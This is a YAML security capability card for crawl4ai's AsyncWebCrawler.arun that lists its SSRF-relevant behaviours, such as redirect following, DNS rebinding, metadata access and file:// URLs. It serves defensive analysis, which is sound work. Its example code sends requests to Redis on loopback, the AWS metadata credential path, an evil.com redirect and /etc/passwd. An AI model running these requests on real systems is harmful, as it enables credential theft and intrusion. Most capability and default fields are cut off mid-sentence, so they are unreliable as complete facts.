# AsyncWebCrawler.arun

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-94b6ed72569d1428
api: AsyncWebCrawler.arun
api_family: crawl4ai.AsyncWebCrawler.arun
runtime:
  language: python
  ecosystem: python-runtime
  package: crawl4ai
  version: legacy-source-bound
capability_class: network-egress
normative_authority: capability-facts-only
bound_sinks: []
roles:
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
facets:
- facet_id: legacy-facet-8a124fa7
  capability: The API issues an HTTP/HTTPS GET request to any URL supplied in the `url` parameter,
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-4ee74cca
  capability: The caller fully controls the scheme, host, port, path, query string, and fragment of the
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-d1332c2c
  capability: The underlying browser engine (Playwright/Chromium) resolves DNS at connect time. An attacker
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-33def96d
  capability: The crawler follows HTTP 3xx redirects by default (standard browser behavior). An attacker
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-0ac94f98
  capability: 'The API can reach any IPv4 or IPv6 address reachable from the host network, including:'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-c4eb9e7c
  capability: The API can connect to any TCP port on the target host by specifying it in the URL
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-f3fd3feb
  capability: 'The API can reach cloud-instance metadata endpoints:'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-36def141
  capability: The headless Chromium browser executes JavaScript on the fetched page. If the target is an
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-9e9a32f0
  capability: 'The Chromium browser engine may accept non-HTTP URL schemes depending on its configuration:'
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-115fa2b8
  capability: The crawled content (full HTML DOM, extracted markdown, cleaned text, optional screenshots,
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-8868524a
  capability: If the crawler is configured with authentication (cookies, headers, client certificates),
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
- facet_id: legacy-facet-d0981726
  capability: The API can send custom HTTP headers if the caller configures them via crawler options
  role_ids:
  - destination-url
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-66052e5e
  role_id: null
  value: HTTP redirects (3xx) are followed automatically by the headless browser; the caller
  security_effect: HTTP redirects (3xx) are followed automatically by the headless browser; the caller
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-4b33f347
  role_id: null
  value: JavaScript is executed on the fetched page by default when the crawler runs in
  security_effect: JavaScript is executed on the fetched page by default when the crawler runs in
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-04f57313
  role_id: null
  value: DNS resolution happens at connection time (not at URL-construction time), enabling
  security_effect: DNS resolution happens at connection time (not at URL-construction time), enabling
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-bf3c445b
  role_id: null
  value: 'The crawler inherits the host''s network environment: it can reach any IP the host'
  security_effect: 'The crawler inherits the host''s network environment: it can reach any IP the host'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-3b6943c0
  role_id: null
  value: The result object includes the full response body/content by default — data
  security_effect: The result object includes the full response body/content by default — data
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-81ef8590
  role_id: null
  value: The headless Chromium instance uses the same filesystem and environment as the host
  security_effect: The headless Chromium instance uses the same filesystem and environment as the host
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a05e910c
  role_id: null
  value: If the crawler instance reuses a browser context or profile, persisted cookies,
  security_effect: If the crawler instance reuses a browser context or profile, persisted cookies,
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "import asyncio\nfrom crawl4ai import AsyncWebCrawler\n\nasync def main():\n    async with AsyncWebCrawler() as crawler:\n        result = await crawler.arun(url=\"https://example.com\")\n        print(result.markdown)\n\nasyncio.run(main())\n"
  capability_edge: "import asyncio\nfrom crawl4ai import AsyncWebCrawler\n\n# Internal host via raw IP (SSRF — reaches RFC 1918 / loopback)\nasync def internal_scan():\n    async with AsyncWebCrawler() as crawler:\n        result = await crawler.arun(url=\"http://127.0.0.1:6379/\")\n        print(result.markdown)  # exfiltrates Redis response\n\n# Cloud metadata service (AWS IMDSv1)\nasync def metadata_theft():\n    async with AsyncWebCrawler() as crawler:\n        result = await crawler.arun(\n            url=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n        )\n        print(result.markdown)  # exfiltrates IAM credential names\n\n# Redirect-based bypass — the initial URL appears benign\nasync def redirect_bypass():\n    async with AsyncWebCrawler() as crawler:\n        # Attacker's server at evil.com 302-redirects to 169.254.169.254\n        result = await crawler.arun(\n            url=\"https://evil.com/redirect-to-metadata\"\n        )\n        print(result.markdown)\
    \  # exfiltrates metadata after silent redirect\n\n# DNS rebinding — evil.com resolves to 1.2.3.4 at check time,\n# then to 127.0.0.1 when the crawler connects\nasync def dns_rebinding():\n    async with AsyncWebCrawler() as crawler:\n        result = await crawler.arun(url=\"http://rebind.evil.com:8080/admin\")\n        print(result.markdown)  # exfiltrates internal admin panel\n\n# File scheme — read local filesystem via Chromium\nasync def local_file_read():\n    async with AsyncWebCrawler() as crawler:\n        result = await crawler.arun(url=\"file:///etc/passwd\")\n        print(result.markdown)  # exfiltrates local password file\n\nasyncio.run(internal_scan())\nasyncio.run(metadata_theft())\nasyncio.run(redirect_bypass())\nasyncio.run(dns_rebinding())\nasyncio.run(local_file_read())\n"
provenance:
- OWASP SSRF Prevention Cheat Sheet — internal IP ranges, cloud metadata endpoints, DNS-rebinding, redirect-following attack vectors
- '{''CWE-918'': ''Server-Side Request Forgery (SSRF)''}'
- crawl4ai library documentation — AsyncWebCrawler.arun is the primary async crawl entry point, backed by Playwright/Chromium headless browser
- Chromium/Playwright URL scheme support — file://, data:, about:, chrome:// schemes accepted by default
- RFC 1918 / RFC 5735 / RFC 6890 — private-use and special-purpose IPv4 address ranges
- AWS IMDSv1 (169.254.169.254), GCP metadata (metadata.google.internal), Azure Instance Metadata Service documentation
```
